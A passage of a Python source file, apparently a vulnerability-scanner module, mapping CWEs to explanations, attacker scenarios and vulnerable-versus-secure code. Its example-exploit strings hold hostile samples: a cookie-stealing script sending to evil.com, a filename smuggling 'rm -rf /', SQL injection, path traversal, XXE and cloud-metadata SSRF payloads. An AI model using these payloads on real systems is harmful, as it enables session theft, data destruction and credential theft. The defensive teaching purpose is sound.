"""
Developer Learning Mode — structured vulnerability explanations.

Produces human-readable, actionable explanations for every finding
so developers understand *why* a vulnerability matters, *how* it is
exploited, and *what* to do about it.

No AI, no external calls.  All content is generated from lookup tables
keyed by CWE, OWASP, rule category, and vulnerability type.

Pipeline integration:
    Called from report_aggregator or scan API response builder.
    Input:  EngineFinding (or dict representation)
    Output: DeveloperExplanation dict
"""

import logging
from typing import Any, Dict, List, Optional

logger = logging.getLogger("engine.developer_learning")

# ─── Type Alias ──────────────────────────────────────────────────────

DeveloperExplanation = Dict[str, Any]


# =====================================================================
#  CWE → Explanation Knowledge Base
# =====================================================================
#
# Maps CWE identifiers to structured explanations.  Covers the most
# common CWEs seen in the rule set plus all OWASP Top-10 2021 items.
# =====================================================================

_CWE_KNOWLEDGE: Dict[str, Dict[str, str]] = {
    # ── Injection ────────────────────────────────────────────────────
    "CWE-89": {
        "why_dangerous": (
            "User-controlled input can modify SQL queries, allowing attackers "
            "to read, modify, or delete any data in the database. In severe "
            "cases, attackers can execute operating system commands through "
            "database features like xp_cmdshell (SQL Server) or COPY "
            "(PostgreSQL)."
        ),
        "real_world_exploit": (
            "An attacker submits ' OR 1=1-- in a login form's username "
            "field. The application builds: SELECT * FROM users WHERE "
            "username='' OR 1=1--' AND password='...'. The OR 1=1 "
            "makes the condition always true, bypassing authentication "
            "entirely. The -- comments out the password check."
        ),
        "attacker_scenario": (
            "1) Attacker identifies input fields that interact with DB  "
            "2) Crafts UNION-based payloads to map database schema  "
            "3) Extracts sensitive tables (users, payments, sessions)  "
            "4) Escalates via stacked queries or DB filesystem access  "
            "5) Installs persistence (new admin account, webshell)"
        ),
        "secure_fix": (
            "Use parameterized queries exclusively. Never concatenate "
            "user input into SQL strings. Use ORM methods (Django ORM, "
            "SQLAlchemy, Hibernate) for common queries. For raw SQL, "
            "use placeholder syntax native to your driver ($1, %s, ?, :name)."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "cursor.execute(f\"SELECT * FROM users WHERE id = {user_id}\")\n\n"
            "# SECURE:\n"
            "cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n\n"
            "# SECURE (ORM):\n"
            "User.objects.filter(id=user_id).first()"
        ),
        "common_mistakes": (
            "Using f-strings or .format() for SQL; trusting client-side "
            "validation; using blocklists instead of parameterization; "
            "escaping quotes manually instead of using prepared statements."
        ),
    },

    "CWE-79": {
        "why_dangerous": (
            "Cross-site scripting allows attackers to inject malicious "
            "JavaScript into web pages viewed by other users. This enables "
            "session hijacking, credential theft, defacement, and drive-by "
            "downloads."
        ),
        "real_world_exploit": (
            "An attacker posts a comment containing <script>document.location="
            "'https://evil.com/steal?c='+document.cookie</script>.  When "
            "another user views the page, their session cookie is sent to "
            "the attacker's server."
        ),
        "attacker_scenario": (
            "1) Attacker finds reflected or stored XSS in the application  "
            "2) Crafts a payload that steals session tokens  "
            "3) Sends phishing link or waits for victim to view stored content  "
            "4) Receives victim's session cookie  "
            "5) Hijacks victim's account with full privileges"
        ),
        "secure_fix": (
            "Apply context-aware output encoding. Use framework auto-escaping "
            "(React JSX, Django templates, Jinja2 autoescape). For rich text, "
            "use a whitelist sanitizer (DOMPurify, bleach). Set HttpOnly and "
            "SameSite flags on session cookies."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "return f'<div>{user_input}</div>'\n\n"
            "# SECURE (Django template — auto-escaped):\n"
            "{{ user_input }}\n\n"
            "# SECURE (explicit):\n"
            "from markupsafe import escape\n"
            "return f'<div>{escape(user_input)}</div>'"
        ),
        "common_mistakes": (
            "Disabling auto-escape (|safe, dangerouslySetInnerHTML); "
            "encoding only < and > but not quotes or event handlers; "
            "sanitizing on input instead of on output."
        ),
    },

    "CWE-78": {
        "why_dangerous": (
            "OS command injection allows attackers to execute arbitrary "
            "system commands on the server. This typically leads to full "
            "server compromise, data exfiltration, lateral movement, and "
            "persistent backdoor installation."
        ),
        "real_world_exploit": (
            "A file conversion endpoint runs: os.system(f'convert {filename} "
            "output.pdf'). An attacker uploads a file named "
            "'; rm -rf / #.jpg', causing the server to execute the "
            "destructive command after the semicolon."
        ),
        "attacker_scenario": (
            "1) Attacker identifies input passed to shell commands  "
            "2) Injects command separator (; && || ` $())  "
            "3) Executes reconnaissance (whoami, id, uname)  "
            "4) Downloads reverse shell payload  "
            "5) Establishes persistent C2 channel"
        ),
        "secure_fix": (
            "Avoid shell commands entirely — use language-native libraries. "
            "If shell is required, use subprocess with shell=False and pass "
            "arguments as a list. Never pass user input to os.system(), "
            "os.popen(), or subprocess with shell=True."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "os.system(f'convert {user_file} output.pdf')\n\n"
            "# SECURE:\n"
            "subprocess.run(['convert', user_file, 'output.pdf'], "
            "shell=False, check=True)\n\n"
            "# BEST: Use a library instead of shell:\n"
            "from PIL import Image\n"
            "img = Image.open(user_file)\n"
            "img.save('output.pdf')"
        ),
        "common_mistakes": (
            "Using shell=True with subprocess; using os.system() or "
            "os.popen(); trusting filename extensions; using shlex.quote() "
            "as sole defense (fragile on Windows)."
        ),
    },

    "CWE-22": {
        "why_dangerous": (
            "Path traversal allows attackers to read or write files outside "
            "the intended directory. Attackers can access /etc/passwd, "
            "application source code, configuration files with secrets, "
            "or overwrite critical system files."
        ),
        "real_world_exploit": (
            "A file download endpoint serves: open(f'/uploads/{filename}'). "
            "An attacker requests ?filename=../../../etc/passwd and reads "
            "the system password file. With write access, they can plant "
            "a webshell in the web root."
        ),
        "attacker_scenario": (
            "1) Attacker tests ../ sequences in file parameters  "
            "2) Reads configuration files (database credentials, API keys)  "
            "3) Downloads application source code  "
            "4) Identifies further vulnerabilities from source  "
            "5) Writes webshell if upload path traversal exists"
        ),
        "secure_fix": (
            "Resolve the canonical path and verify it starts with the "
            "expected base directory. Use os.path.realpath() + startswith() "
            "check. Never use user input directly in file paths. Use a "
            "whitelist of allowed filenames when possible."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "path = os.path.join(UPLOAD_DIR, user_filename)\n"
            "return open(path).read()\n\n"
            "# SECURE:\n"
            "path = os.path.realpath(os.path.join(UPLOAD_DIR, user_filename))\n"
            "if not path.startswith(os.path.realpath(UPLOAD_DIR)):\n"
            "    raise ValueError('Path traversal detected')\n"
            "return open(path).read()"
        ),
        "common_mistakes": (
            "Stripping only ../ (attackers use ....// or URL-encoding); "
            "checking before canonicalization; using os.path.join without "
            "realpath validation; trusting Content-Disposition filenames."
        ),
    },

    "CWE-502": {
        "why_dangerous": (
            "Insecure deserialization allows attackers to inject malicious "
            "objects that execute arbitrary code when deserialized. This "
            "typically leads to remote code execution with the privileges "
            "of the application."
        ),
        "real_world_exploit": (
            "A Python application uses pickle.loads(request.data) to "
            "deserialize user sessions. An attacker crafts a pickle payload "
            "containing __reduce__ that calls os.system('reverse_shell'), "
            "gaining full server access."
        ),
        "attacker_scenario": (
            "1) Attacker identifies deserialization entry points  "
            "2) Crafts payload using gadget chains (ysoserial, pickle RCE)  "
            "3) Submits payload via API, cookie, or message queue  "
            "4) Server deserializes and executes attacker's code  "
            "5) Attacker gains RCE with application privileges"
        ),
        "secure_fix": (
            "Never deserialize untrusted data. Use JSON or Protocol "
            "Buffers instead of native serialization. If deserialization "
            "is required, use a whitelist of allowed classes, validate "
            "HMAC signatures, and run in a sandboxed environment."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "data = pickle.loads(request.data)\n\n"
            "# SECURE:\n"
            "data = json.loads(request.data)\n\n"
            "# If pickle is required, sign and verify:\n"
            "import hmac\n"
            "sig = hmac.new(SECRET, payload, 'sha256').hexdigest()\n"
            "if not hmac.compare_digest(sig, received_sig):\n"
            "    raise ValueError('Tampered payload')"
        ),
        "common_mistakes": (
            "Using pickle/marshal for user input; using yaml.load() "
            "instead of yaml.safe_load(); deserializing JWT payloads "
            "without signature verification; using Java ObjectInputStream "
            "without class filtering."
        ),
    },

    "CWE-918": {
        "why_dangerous": (
            "Server-Side Request Forgery allows attackers to make the "
            "server send requests to internal services, cloud metadata "
            "endpoints (169.254.169.254), and other resources not directly "
            "accessible from the internet."
        ),
        "real_world_exploit": (
            "A URL preview feature fetches: requests.get(user_url). An "
            "attacker submits http://169.254.169.254/latest/meta-data/"
            "iam/security-credentials/ to steal AWS IAM credentials from "
            "the metadata service, gaining full cloud access."
        ),
        "attacker_scenario": (
            "1) Attacker finds server-side URL fetch functionality  "
            "2) Tests internal addresses (127.0.0.1, 10.x.x.x, 169.254.169.254)  "
            "3) Discovers cloud metadata endpoint  "
            "4) Extracts IAM credentials or service account tokens  "
            "5) Pivots to cloud resources (S3, databases, other services)"
        ),
        "secure_fix": (
            "Validate and restrict destination URLs. Use an allowlist of "
            "permitted domains. Block private IP ranges (RFC 1918, link-local, "
            "loopback). Disable redirects or re-validate after redirect. "
            "Use a dedicated egress proxy with network-level controls."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "resp = requests.get(user_url)\n\n"
            "# SECURE:\n"
            "import ipaddress, urllib.parse\n"
            "parsed = urllib.parse.urlparse(user_url)\n"
            "ip = socket.gethostbyname(parsed.hostname)\n"
            "if ipaddress.ip_address(ip).is_private:\n"
            "    raise ValueError('Private IP blocked')\n"
            "resp = requests.get(user_url, allow_redirects=False)"
        ),
        "common_mistakes": (
            "Blocking only 127.0.0.1 (attackers use 0x7f000001, 0177.0.0.1); "
            "allowing redirects to internal IPs; DNS rebinding attacks; "
            "not blocking IPv6 addresses (::1)."
        ),
    },

    "CWE-287": {
        "why_dangerous": (
            "Broken authentication allows attackers to compromise user "
            "accounts, impersonate other users, or bypass login entirely. "
            "This can lead to unauthorized access to sensitive data and "
            "administrative functions."
        ),
        "real_world_exploit": (
            "An application checks: if password == stored_password. An "
            "attacker discovers the comparison is case-insensitive and "
            "the password is truncated to 8 characters, making brute-force "
            "trivial. Or JWT tokens use 'none' algorithm, allowing "
            "attackers to forge any token."
        ),
        "attacker_scenario": (
            "1) Attacker tests authentication edge cases  "
            "2) Discovers token forgery, password bypass, or session fixation  "
            "3) Crafts forged credentials or manipulated tokens  "
            "4) Gains access as any user including administrators  "
            "5) Exfiltrates data or modifies system configuration"
        ),
        "secure_fix": (
            "Use proven authentication libraries (Passport.js, Spring Security, "
            "Django auth). Hash passwords with bcrypt/argon2. Validate JWT "
            "signatures with algorithm whitelist. Implement rate limiting, "
            "account lockout, and MFA."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "if password == stored_password:  # plaintext comparison\n\n"
            "# SECURE:\n"
            "from passlib.hash import bcrypt\n"
            "hashed = bcrypt.hash(password)  # registration\n"
            "if bcrypt.verify(password, stored_hash):  # login\n"
            "    create_session(user)"
        ),
        "common_mistakes": (
            "Storing passwords in plaintext; using MD5/SHA1 without salt; "
            "not validating JWT algorithm (alg: none attack); session "
            "tokens with insufficient entropy; no account lockout."
        ),
    },

    "CWE-798": {
        "why_dangerous": (
            "Hardcoded credentials in source code are trivially discoverable "
            "by anyone with access to the repository, build artifacts, or "
            "decompiled binaries. They cannot be rotated without a code "
            "change and deployment."
        ),
        "real_world_exploit": (
            "A developer commits AWS_SECRET_ACCESS_KEY='AKIA...' to a "
            "public GitHub repository. Automated scanners detect it within "
            "minutes. Attackers use the key to access S3 buckets, spin up "
            "crypto-mining instances, and exfiltrate customer data."
        ),
        "attacker_scenario": (
            "1) Attacker scans public repos (GitHub, GitLab) for secrets  "
            "2) Finds API keys, database passwords, JWT secrets  "
            "3) Uses credentials to access cloud services  "
            "4) Exfiltrates data or deploys malicious resources  "
            "5) Organizations discover breach weeks/months later"
        ),
        "secure_fix": (
            "Store secrets in environment variables, secret managers "
            "(AWS Secrets Manager, HashiCorp Vault, Azure Key Vault), "
            "or encrypted configuration. Use .gitignore for .env files. "
            "Rotate any exposed credentials immediately."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "API_KEY = 'sk-abc123def456'\n"
            "DB_PASSWORD = 'admin123'\n\n"
            "# SECURE:\n"
            "import os\n"
            "API_KEY = os.environ['API_KEY']\n"
            "DB_PASSWORD = os.environ['DB_PASSWORD']\n\n"
            "# Or use a secret manager:\n"
            "from aws_secretsmanager import get_secret\n"
            "API_KEY = get_secret('prod/api-key')"
        ),
        "common_mistakes": (
            "Committing .env files; hardcoding in Docker build args; "
            "logging secrets in error messages; using default passwords "
            "in production; embedding in CI/CD configs."
        ),
    },

    "CWE-327": {
        "why_dangerous": (
            "Using broken or weak cryptographic algorithms (MD5, SHA1, DES, "
            "RC4) provides a false sense of security. Attackers can break "
            "these algorithms with commodity hardware, recovering passwords, "
            "forging signatures, or decrypting sensitive data."
        ),
        "real_world_exploit": (
            "An application stores passwords as MD5(password). An attacker "
            "obtains the database dump and uses rainbow tables to crack "
            "90%+ of passwords within hours. GPU-based cracking can test "
            "billions of MD5 hashes per second."
        ),
        "attacker_scenario": (
            "1) Attacker obtains encrypted/hashed data (via SQLi, backup leak)  "
            "2) Identifies weak algorithm from hash format or config  "
            "3) Uses rainbow tables, GPU cracking, or known-plaintext attacks  "
            "4) Recovers passwords, decryption keys, or forges signatures  "
            "5) Uses recovered credentials for lateral movement"
        ),
        "secure_fix": (
            "For passwords: use bcrypt, scrypt, or Argon2id. For hashing: "
            "use SHA-256 or SHA-3. For encryption: use AES-256-GCM or "
            "ChaCha20-Poly1305. For signatures: use Ed25519 or ECDSA P-256. "
            "Never implement custom cryptography."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "import hashlib\n"
            "h = hashlib.md5(password.encode()).hexdigest()\n\n"
            "# SECURE (password hashing):\n"
            "import bcrypt\n"
            "hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())\n\n"
            "# SECURE (general hashing):\n"
            "h = hashlib.sha256(data).hexdigest()"
        ),
        "common_mistakes": (
            "Using MD5/SHA1 for passwords; using ECB mode for encryption; "
            "hardcoding encryption keys; using random instead of secrets "
            "module; not using authenticated encryption (GCM/CCM)."
        ),
    },

    "CWE-862": {
        "why_dangerous": (
            "Missing authorization checks allow attackers to access resources "
            "or perform actions they should not be permitted to. This commonly "
            "leads to horizontal privilege escalation (accessing other users' "
            "data) or vertical escalation (admin actions as regular user)."
        ),
        "real_world_exploit": (
            "An API endpoint GET /api/users/123/profile returns user profile "
            "data. By changing the ID to 124, an attacker accesses another "
            "user's profile. The endpoint only checks authentication, not "
            "whether the logged-in user owns the requested resource."
        ),
        "attacker_scenario": (
            "1) Attacker authenticates as a regular user  "
            "2) Enumerates resource IDs in API requests  "
            "3) Accesses other users' data (IDOR)  "
            "4) Discovers admin endpoints without authorization checks  "
            "5) Performs privileged actions (delete users, modify settings)"
        ),
        "secure_fix": (
            "Implement authorization checks on every endpoint. Use "
            "middleware/decorators for consistent enforcement. Verify the "
            "current user owns or has permission for the requested resource. "
            "Use RBAC or ABAC frameworks."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "@app.get('/api/users/{user_id}/profile')\n"
            "def get_profile(user_id: int):\n"
            "    return db.query(User).get(user_id)\n\n"
            "# SECURE:\n"
            "@app.get('/api/users/{user_id}/profile')\n"
            "def get_profile(user_id: int, current_user = Depends(get_current_user)):\n"
            "    if current_user.id != user_id and not current_user.is_admin:\n"
            "        raise HTTPException(403, 'Forbidden')\n"
            "    return db.query(User).get(user_id)"
        ),
        "common_mistakes": (
            "Relying only on authentication (not authorization); using "
            "sequential IDs without ownership checks; trusting client-side "
            "role checks; missing authorization on API endpoints added later."
        ),
    },

    "CWE-611": {
        "why_dangerous": (
            "XML External Entity (XXE) injection allows attackers to read "
            "local files, perform SSRF, cause denial of service, and in "
            "some cases achieve remote code execution through XML parser "
            "features."
        ),
        "real_world_exploit": (
            "An attacker submits XML with: <!DOCTYPE foo [<!ENTITY xxe "
            "SYSTEM 'file:///etc/passwd'>]><data>&xxe;</data>. The XML "
            "parser expands the entity, including the contents of "
            "/etc/passwd in the response."
        ),
        "attacker_scenario": (
            "1) Attacker identifies XML parsing endpoints  "
            "2) Crafts DOCTYPE with ENTITY declarations  "
            "3) Reads local files (config, source code, credentials)  "
            "4) Uses SSRF via http:// entities to scan internal network  "
            "5) Causes DoS via billion laughs (entity expansion)"
        ),
        "secure_fix": (
            "Disable external entity processing and DTD loading. Use "
            "defusedxml library in Python. Configure SAX/DOM parsers to "
            "reject external entities. Use JSON instead of XML when possible."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "from xml.etree.ElementTree import parse\n"
            "tree = parse(user_xml_file)\n\n"
            "# SECURE:\n"
            "import defusedxml.ElementTree as ET\n"
            "tree = ET.parse(user_xml_file)\n\n"
            "# Or configure manually:\n"
            "parser = ET.XMLParser()\n"
            "parser.entity = {}  # disable entity expansion"
        ),
        "common_mistakes": (
            "Using default XML parser settings; not disabling DTD; "
            "parsing SOAP/SVG/DOCX without XXE protection; trusting "
            "uploaded XML/XLSX files."
        ),
    },

    "CWE-362": {
        "why_dangerous": (
            "Race conditions occur when multiple threads or processes access "
            "shared resources without proper synchronization. This can lead "
            "to authentication bypass, financial fraud (double-spending), "
            "data corruption, and privilege escalation."
        ),
        "real_world_exploit": (
            "A money transfer endpoint: reads balance, checks >= amount, "
            "deducts amount. Two simultaneous requests both read the same "
            "balance before either deducts, allowing double-spending. "
            "A $100 balance allows two $100 transfers totaling $200."
        ),
        "attacker_scenario": (
            "1) Attacker identifies state-dependent operations  "
            "2) Sends many parallel requests (race window exploitation)  "
            "3) Exploits TOCTOU gap in check-then-act patterns  "
            "4) Achieves double-spend, privilege escalation, or bypass  "
            "5) Repeats attack for cumulative impact"
        ),
        "secure_fix": (
            "Use atomic operations (database transactions with proper "
            "isolation level, Redis INCR, compare-and-swap). Use "
            "pessimistic locking (SELECT FOR UPDATE) or optimistic "
            "locking (version columns). Use idempotency keys."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "balance = get_balance(user_id)\n"
            "if balance >= amount:\n"
            "    set_balance(user_id, balance - amount)\n\n"
            "# SECURE (atomic with DB transaction):\n"
            "with db.begin():\n"
            "    result = db.execute(\n"
            "        'UPDATE accounts SET balance = balance - :amt '\n"
            "        'WHERE user_id = :uid AND balance >= :amt',\n"
            "        {'amt': amount, 'uid': user_id}\n"
            "    )\n"
            "    if result.rowcount == 0:\n"
            "        raise InsufficientFunds()"
        ),
        "common_mistakes": (
            "Using non-atomic read-then-write patterns; not using DB "
            "transactions; using application-level locks in distributed "
            "systems; missing idempotency on financial operations."
        ),
    },

    "CWE-829": {
        "why_dangerous": (
            "Including code or dependencies from untrusted sources allows "
            "attackers to inject malicious code that runs with the "
            "application's full privileges. Supply chain attacks can "
            "affect thousands of downstream users."
        ),
        "real_world_exploit": (
            "The event-stream npm package was compromised with a targeted "
            "backdoor that stole cryptocurrency wallet credentials from a "
            "specific application. The malicious code was hidden in a "
            "dependency and remained undetected for weeks."
        ),
        "attacker_scenario": (
            "1) Attacker compromises a popular dependency  "
            "2) Adds malicious postinstall script or runtime backdoor  "
            "3) Publishes new version (or typosquatting package)  "
            "4) Victims install the package via npm/pip/maven  "
            "5) Malicious code steals credentials or installs persistence"
        ),
        "secure_fix": (
            "Pin dependency versions exactly. Use lock files (package-lock.json, "
            "Pipfile.lock). Verify integrity hashes. Audit dependencies "
            "regularly. Use scoped registries for private packages."
        ),
        "secure_code_python": (
            "# VULNERABLE (requirements.txt):\n"
            "requests>=2.0\n"
            "flask\n\n"
            "# SECURE:\n"
            "requests==2.31.0\n"
            "flask==3.0.0\n\n"
            "# Best: Use hash verification:\n"
            "requests==2.31.0 \\\n"
            "    --hash=sha256:abc123..."
        ),
        "common_mistakes": (
            "Using wildcard versions (*); not using lock files; pulling "
            "from default public registry for private packages; not "
            "auditing transitive dependencies."
        ),
    },

    "CWE-208": {
        "why_dangerous": (
            "Timing side-channels in credential comparison allow attackers "
            "to deduce secrets one character at a time. Standard string "
            "comparison short-circuits on the first differing byte, leaking "
            "how many leading bytes are correct."
        ),
        "real_world_exploit": (
            "An API compares API keys with ==. An attacker measures "
            "response times for different key prefixes. Correct first "
            "characters take slightly longer. After ~100 requests per "
            "position, the attacker reconstructs the full API key."
        ),
        "attacker_scenario": (
            "1) Attacker sends requests with varying first characters  "
            "2) Measures response time distributions statistically  "
            "3) Identifies correct character by timing differences  "
            "4) Repeats for each position to reconstruct full secret  "
            "5) Uses recovered secret for unauthorized access"
        ),
        "secure_fix": (
            "Use constant-time comparison functions: hmac.compare_digest() "
            "in Python, crypto.timingSafeEqual() in Node.js, "
            "MessageDigest.isEqual() in Java."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "if api_key == stored_key:\n"
            "    grant_access()\n\n"
            "# SECURE:\n"
            "import hmac\n"
            "if hmac.compare_digest(api_key, stored_key):\n"
            "    grant_access()"
        ),
        "common_mistakes": (
            "Using == for token/password comparison; using string "
            "comparison after hashing (hash comparison is also vulnerable); "
            "not considering timing in HMAC verification."
        ),
    },

    "CWE-319": {
        "why_dangerous": (
            "Transmitting sensitive data over unencrypted HTTP allows "
            "any network intermediary to read and modify the traffic. "
            "This includes credentials, session tokens, personal data, "
            "and API keys."
        ),
        "real_world_exploit": (
            "A mobile app sends login credentials over HTTP. An attacker "
            "on the same Wi-Fi network uses Wireshark to capture the "
            "plaintext username and password, then logs in as the victim."
        ),
        "attacker_scenario": (
            "1) Attacker performs ARP spoofing on local network  "
            "2) Captures HTTP traffic with credentials and session tokens  "
            "3) Replays stolen session tokens to hijack accounts  "
            "4) Modifies responses to inject malicious content  "
            "5) Conducts large-scale credential harvesting on public Wi-Fi"
        ),
        "secure_fix": (
            "Use HTTPS everywhere (TLS 1.2+). Set HSTS headers. "
            "Redirect HTTP to HTTPS. Use Secure flag on cookies. "
            "Pin certificates for mobile applications."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "requests.get('http://api.example.com/data')\n\n"
            "# SECURE:\n"
            "requests.get('https://api.example.com/data', verify=True)"
        ),
        "common_mistakes": (
            "Using HTTP for internal services (still vulnerable to "
            "lateral movement); disabling TLS verification (verify=False); "
            "not setting HSTS; using self-signed certificates in production."
        ),
    },

    "CWE-427": {
        "why_dangerous": (
            "Dependency confusion allows attackers to hijack private "
            "package installations by publishing a higher-versioned "
            "package with the same name on a public registry."
        ),
        "real_world_exploit": (
            "A company uses an internal package 'company-auth'. An attacker "
            "publishes 'company-auth' version 99.0.0 on npm with malicious "
            "code. The company's CI/CD resolves from npm (higher version) "
            "instead of the private registry, executing the attacker's code."
        ),
        "attacker_scenario": (
            "1) Attacker discovers internal package names (error messages, job postings)  "
            "2) Publishes same-named package on public registry with high version  "
            "3) CI/CD or developer installs from public registry  "
            "4) Malicious postinstall script exfiltrates environment variables  "
            "5) Attacker gains access to internal systems via stolen credentials"
        ),
        "secure_fix": (
            "Use scoped namespaces (@company/pkg) for private packages. "
            "Configure registries to only resolve private names from "
            "private registry. Use .npmrc or pip.conf with explicit "
            "registry mappings."
        ),
        "secure_code_python": (
            "# VULNERABLE (.npmrc):\n"
            "registry=https://registry.npmjs.org\n\n"
            "# SECURE (.npmrc):\n"
            "@company:registry=https://npm.company.internal\n"
            "registry=https://registry.npmjs.org"
        ),
        "common_mistakes": (
            "Not scoping private packages; using default registry for all "
            "packages; not configuring pip --extra-index-url correctly; "
            "publishing internal package names publicly for 'reservation'."
        ),
    },

    "CWE-306": {
        "why_dangerous": (
            "Missing authentication for critical functions allows anyone "
            "to perform sensitive operations without proving their identity. "
            "Admin endpoints, configuration APIs, and internal services are "
            "common targets."
        ),
        "real_world_exploit": (
            "An admin API endpoint /api/admin/delete-user has no "
            "authentication check. An attacker discovers it via directory "
            "brute-forcing and deletes arbitrary user accounts."
        ),
        "attacker_scenario": (
            "1) Attacker discovers unauthenticated admin endpoints  "
            "2) Performs destructive actions (delete data, modify settings)  "
            "3) Creates new admin accounts for persistence  "
            "4) Exfiltrates sensitive data from admin views  "
            "5) Modifies application configuration to enable further attacks"
        ),
        "secure_fix": (
            "Require authentication on all endpoints by default. Use "
            "middleware that denies unauthenticated requests unless "
            "explicitly marked as public. Implement defense in depth "
            "with network-level access controls."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "@app.route('/admin/delete-user', methods=['POST'])\n"
            "def delete_user():\n"
            "    user_id = request.json['user_id']\n"
            "    db.delete(user_id)\n\n"
            "# SECURE:\n"
            "@app.route('/admin/delete-user', methods=['POST'])\n"
            "@require_admin  # decorator checks auth + admin role\n"
            "def delete_user():\n"
            "    user_id = request.json['user_id']\n"
            "    db.delete(user_id)"
        ),
        "common_mistakes": (
            "Protecting UI but not API; relying on URL obscurity; "
            "allowing unauthenticated health/status endpoints that "
            "leak internal information."
        ),
    },

    "CWE-434": {
        "why_dangerous": (
            "Unrestricted file upload allows attackers to upload executable "
            "files (webshells, malware) to the server. If the uploaded file "
            "is served from a web-accessible directory, the attacker gains "
            "remote code execution."
        ),
        "real_world_exploit": (
            "A profile picture upload accepts any file type. An attacker "
            "uploads a PHP webshell as avatar.php.jpg (double extension). "
            "Apache processes it as PHP, giving the attacker shell access."
        ),
        "attacker_scenario": (
            "1) Attacker identifies file upload functionality  "
            "2) Tests for restricted types by manipulating extension/MIME  "
            "3) Uploads webshell (PHP, JSP, ASPX)  "
            "4) Accesses uploaded file URL to execute commands  "
            "5) Establishes persistent backdoor access"
        ),
        "secure_fix": (
            "Validate file type by content (magic bytes), not extension. "
            "Store uploads outside web root. Generate random filenames. "
            "Use a CDN/object storage (S3) instead of local filesystem. "
            "Set Content-Disposition: attachment for downloads."
        ),
        "secure_code_python": (
            "# VULNERABLE:\n"
            "file.save(os.path.join('uploads', file.filename))\n\n"
            "# SECURE:\n"
            "import uuid, magic\n"
            "mime = magic.from_buffer(file.read(2048), mime=True)\n"
            "ALLOWED = {'image/jpeg', 'image/png', 'image/gif'}\n"
            "if mime not in ALLOWED:\n"
            "    raise ValueError('Invalid file type')\n"
            "safe_name = f'{uuid.uuid4()}.{ALLOWED_EXT[mime]}'\n"
            "file.save(os.path.join(UPLOAD_DIR, safe_name))"
        ),
        "common_mistakes": (
            "Checking only file extension; trusting Content-Type header; "
            "serving uploads from web root; not scanning for malware; "
            "allowing SVG uploads (XSS vector)."
        ),
    },
}


# =====================================================================
#  Category → Fallback Explanations
# =====================================================================

_CATEGORY_FALLBACK: Dict[str, Dict[str, str]] = {
    "injection": {
        "why_dangerous": "Injection flaws allow attackers to send hostile data to an interpreter, causing unintended command/query execution.",
        "real_world_exploit": "Attacker manipulates input to alter the intended command/query, potentially reading the entire database or executing system commands.",
        "attacker_scenario": "Attacker identifies injectable input, crafts exploits to extract data, escalate privileges, or execute code.",
        "secure_fix": "Use parameterized queries, prepared statements, or safe APIs that avoid the interpreter entirely.",
        "common_mistakes": "String concatenation for queries, trusting client-side validation, incomplete escaping.",
    },
    "auth": {
        "why_dangerous": "Authentication flaws let attackers compromise passwords, tokens, or sessions to assume other users' identities.",
        "real_world_exploit": "Attackers exploit weak token generation, credential stuffing, or session fixation to gain unauthorized access.",
        "attacker_scenario": "Attacker tests default credentials, brute-forces weak passwords, or forges session tokens.",
        "secure_fix": "Use proven auth frameworks, bcrypt/argon2 for passwords, secure token generation, and MFA.",
        "common_mistakes": "Plaintext password storage, weak session tokens, missing rate limiting, no account lockout.",
    },
    "crypto": {
        "why_dangerous": "Weak cryptography gives a false sense of security — attackers can break encryption, forge signatures, or crack hashes.",
        "real_world_exploit": "Attacker cracks MD5-hashed passwords with rainbow tables or exploits ECB mode to detect patterns.",
        "attacker_scenario": "Attacker obtains encrypted data and uses known-plaintext, brute-force, or algorithm-specific attacks.",
        "secure_fix": "Use modern algorithms: AES-256-GCM for encryption, bcrypt/argon2 for passwords, SHA-256+ for hashing.",
        "common_mistakes": "Using MD5/SHA1 for passwords, ECB mode, hardcoded keys, custom crypto implementations.",
    },
    "rce": {
        "why_dangerous": "Remote code execution allows attackers to run arbitrary commands on the server, leading to full compromise.",
        "real_world_exploit": "Attacker injects commands through unsanitized input passed to system(), eval(), or deserialization.",
        "attacker_scenario": "Attacker achieves command execution, downloads tools, establishes persistence, pivots to internal network.",
        "secure_fix": "Avoid shell commands and eval(). Use language-native libraries. If shell is necessary, use safe APIs with argument lists.",
        "common_mistakes": "Using eval/exec on user input, shell=True, deserialization of untrusted data.",
    },
    "deserialization": {
        "why_dangerous": "Insecure deserialization can lead to RCE, replay attacks, injection, and privilege escalation.",
        "real_world_exploit": "Attacker crafts serialized payload with gadget chains that execute code upon deserialization.",
        "attacker_scenario": "Attacker identifies deserialization endpoints, uses tools like ysoserial to generate exploit payloads.",
        "secure_fix": "Never deserialize untrusted data. Use JSON. If required, verify HMAC signatures and whitelist allowed classes.",
        "common_mistakes": "Using pickle/marshal on user data, yaml.load() instead of safe_load(), Java ObjectInputStream without filters.",
    },
    "framework_misuse": {
        "why_dangerous": "Framework misconfiguration disables built-in security features, exposing the application to attacks the framework would normally prevent.",
        "real_world_exploit": "Django DEBUG=True in production leaks source code, stack traces, and environment variables to attackers.",
        "attacker_scenario": "Attacker identifies misconfigured framework, leverages disabled protections for XSS, CSRF, or information disclosure.",
        "secure_fix": "Follow framework security guides. Enable CSRF protection, auto-escaping, secure headers, and production-mode settings.",
        "common_mistakes": "Debug mode in production, CSRF disabled, CORS wildcard, missing security headers.",
    },
    "path_traversal": {
        "why_dangerous": "Path traversal lets attackers read/write arbitrary files on the server, accessing source code, config, and credentials.",
        "real_world_exploit": "Attacker uses ../ sequences to escape intended directory and read /etc/passwords or application config files.",
        "attacker_scenario": "Attacker traverses directories to read sensitive files, download source code, or overwrite critical files.",
        "secure_fix": "Canonicalize paths and verify they stay within the intended base directory. Use chroot or container isolation.",
